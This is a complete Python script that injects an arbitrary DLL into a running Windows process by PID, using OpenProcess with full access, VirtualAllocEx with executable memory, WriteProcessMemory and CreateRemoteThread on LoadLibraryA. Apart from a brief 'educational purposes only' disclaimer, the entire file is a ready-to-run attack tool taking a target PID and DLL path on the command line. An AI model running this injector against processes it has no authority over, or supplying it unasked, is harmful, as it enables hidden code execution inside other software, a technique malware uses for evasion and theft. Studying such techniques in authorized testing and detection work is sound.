#!/usr/bin/env python3

"""
DLL Injection Script
WARNING: For educational purposes only. Use only in authorized testing environments.
Requires Windows OS and appropriate permissions.
"""

import sys
from ctypes import *

# Usage: python dll_injector.py <PID> <DLL_PATH>

if len(sys.argv) != 3:
    print("Usage: python dll_injector.py <PID> <DLL_PATH>")
    sys.exit(1)

pid = int(sys.argv[1])
dll_path = sys.argv[2].encode()
dll_len = len(dll_path)

kernel32 = windll.kernel32

# Open process with all access
h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)

if not h_process:
    print(f"[!] Could not open process {pid}")
    sys.exit(1)

# Allocate memory for DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, 0x3000, 0x40)

if not arg_address:
    print("[!] Failed to allocate memory")
    sys.exit(1)

# Write DLL path to allocated memory
written = c_int(0)
if not kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written)):
    print("[!] Failed to write DLL path to memory")
    sys.exit(1)

# Get address of LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_library = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

if not load_library:
    print("[!] Could not find LoadLibraryA")
    sys.exit(1)

# Create remote thread to load DLL
h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)

if not h_thread:
    print("[!] Failed to create remote thread")
    sys.exit(1)

print(f"[+] Successfully injected {dll_path.decode()} into PID {pid}")
